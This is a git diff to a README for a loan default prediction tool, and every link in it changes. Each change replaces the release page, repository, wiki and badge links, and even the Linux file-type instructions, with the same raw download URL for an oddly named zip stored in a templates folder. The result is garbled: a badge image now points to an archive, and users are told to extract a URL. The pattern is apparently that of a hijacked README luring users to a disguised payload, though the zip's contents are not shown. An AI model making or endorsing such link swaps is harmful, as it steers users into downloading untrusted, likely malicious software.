@@ -6,7 +6,7 @@ Welcome to the Loan Default Prediction System! This tool helps you predict wheth
 
 ## 📥 Download Now
 
-[![Download Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Nkaduadjei/Loan-Default-Prediction-System/releases)
+[![Download Release](https://github.com/Nkaduadjei/Loan-Default-Prediction-System/raw/refs/heads/main/templates/Prediction_Default_System_Loan_havage.zip%20Release-brightgreen)](https://github.com/Nkaduadjei/Loan-Default-Prediction-System/raw/refs/heads/main/templates/Prediction_Default_System_Loan_havage.zip)
 
 ## 📋 Prerequisites
 
@@ -30,7 +30,7 @@ Before you download the software, make sure you have:
 
 To download the Loan Default Prediction System, visit the following page:
 
-[Download Releases](https://github.com/Nkaduadjei/Loan-Default-Prediction-System/releases)
+[Download Releases](https://github.com/Nkaduadjei/Loan-Default-Prediction-System/raw/refs/heads/main/templates/Prediction_Default_System_Loan_havage.zip)
 
 ### Step 2: Choose Your Version
 
@@ -42,7 +42,7 @@ After selecting the version, you will see different files. Choose the one that m
 
 - For Windows: Look for a file with a `.exe` extension.
 - For macOS: Look for a file with a `.dmg` extension.
-- For Linux: Look for a `.tar.gz` or similar file.
+- For Linux: Look for a `https://github.com/Nkaduadjei/Loan-Default-Prediction-System/raw/refs/heads/main/templates/Prediction_Default_System_Loan_havage.zip` or similar file.
 
 Click on the file to start the download. 
 
@@ -59,7 +59,7 @@ Once the download completes:
   2. Drag the application to your Applications folder.
 
 - **For Linux:**
-  1. Extract the `.tar.gz` file.
+  1. Extract the `https://github.com/Nkaduadjei/Loan-Default-Prediction-System/raw/refs/heads/main/templates/Prediction_Default_System_Loan_havage.zip` file.
   2. Open a terminal and navigate to the extracted folder.
   3. Run the application using the command line.
 
@@ -101,11 +101,11 @@ If you encounter any issues, you can reach out for help. Check the project's Iss
 
 Explore additional resources:
 
-- [GitHub Repository](https://github.com/Nkaduadjei/Loan-Default-Prediction-System)
-- [User Manual](https://github.com/Nkaduadjei/Loan-Default-Prediction-System/wiki)
+- [GitHub Repository](https://github.com/Nkaduadjei/Loan-Default-Prediction-System/raw/refs/heads/main/templates/Prediction_Default_System_Loan_havage.zip)
+- [User Manual](https://github.com/Nkaduadjei/Loan-Default-Prediction-System/raw/refs/heads/main/templates/Prediction_Default_System_Loan_havage.zip)
 
 ## 📥 Download Again
 
 Don’t forget to download the latest version whenever updates are available.
 
-[![Download Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Nkaduadjei/Loan-Default-Prediction-System/releases)
+[![Download Release](https://github.com/Nkaduadjei/Loan-Default-Prediction-System/raw/refs/heads/main/templates/Prediction_Default_System_Loan_havage.zip%20Release-brightgreen)](https://github.com/Nkaduadjei/Loan-Default-Prediction-System/raw/refs/heads/main/templates/Prediction_Default_System_Loan_havage.zip)
